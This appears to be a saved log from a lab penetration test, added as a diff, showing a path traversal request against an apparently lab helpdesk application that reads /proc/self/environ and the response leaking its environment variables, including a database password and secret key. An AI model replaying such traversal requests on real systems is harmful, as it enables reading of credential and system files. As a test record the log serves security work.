@@ -1,0 +1,48 @@
+###### Part A2: /proc/self/environ via traversal ######
+>>> REQUEST: GET /attachments/download/?path=../../../../../../proc/self/environ
+
+>>> RESPONSE HEADERS:
+HTTP/1.1 200 OK
+Server: nginx/1.27.5
+Date: Mon, 12 Oct 2026 18:26:38 GMT
+Content-Type: application/octet-stream
+Content-Length: 1048
+Connection: keep-alive
+Content-Disposition: attachment; filename="environ"
+X-Frame-Options: DENY
+Vary: Cookie
+X-Content-Type-Options: nosniff
+Referrer-Policy: same-origin
+Cross-Origin-Opener-Policy: same-origin
+
+>>> RESPONSE BODY (NUL->newline for readability):
+PYTHON_SHA256=f4b1bfb3c79b5bb11b8d228a12504163b4c0dab4d679828d8f5f26b6cb6ab35d
+POSTGRES_HOST=postgres
+HOSTNAME=dc261c4b87e6
+PYTHON_VERSION=3.13.16
+POSTGRES_PASSWORD=helpdesk
+HELPDESK_SUBMIT_A_TICKET_PUBLIC=True
+HELPDESK_KB_ENABLED=True
+HELPDESK_VALIDATE_ATTACHMENT_TYPES=False
+MERIDIAN_SECRET_KEY=503m-lab-secret-not-for-production
+PWD=/opt/meridian/standalone
+MERIDIAN_STATIC_ROOT=/opt/meridian/standalone/static
+MERIDIAN_HTTPS_COOKIES=false
+HOME=/root
+GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305
+UV_SYSTEM_PYTHON=1
+DJANGO_SETTINGS_MODULE=standalone.config.settings
+PYTHONPATH=/opt/meridian/src:/opt/meridian
+POSTGRES_PORT=5432
+HELPDESK_VIEW_A_TICKET_PUBLIC=True
+SHLVL=0
+POSTGRES_USER=helpdesk
+MERIDIAN_ALLOWED_HOSTS=*
+SERVER_EMAIL=helpdesk@503m.local
+MERIDIAN_DEBUG=True
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+MERIDIAN_CSRF_TRUSTED_ORIGINS=http://127.0.0.1:5001,http://localhost:5001
+GUNICORN_NUM_WORKERS=8
+DEFAULT_FROM_EMAIL=helpdesk@503m.local
+POSTGRES_DB=helpdesk
+OLDPWD=/opt/meridian/standalone
